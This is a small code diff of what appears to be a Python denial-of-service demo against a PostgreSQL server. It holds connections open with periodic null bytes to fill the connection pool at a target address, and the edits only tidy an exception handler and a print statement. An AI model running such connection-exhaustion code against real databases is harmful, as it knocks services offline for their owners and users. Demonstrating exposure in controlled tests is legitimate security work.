@@ -25,10 +25,10 @@ def hold_connection(i):
         while True:
             time.sleep(5)
             s.send(b'\x00') 
-    except Exception as e:
+    except Exception:
         pass
 
-print(f"--- POSTGRES VULNERABILITY DEMO (DoS) ---")
+print("--- POSTGRES VULNERABILITY DEMO (DoS) ---")
 print(f"Target: {TARGET_IP}:{TARGET_PORT}")
 print("[*] Filling connection pool to prove exposure...")
 
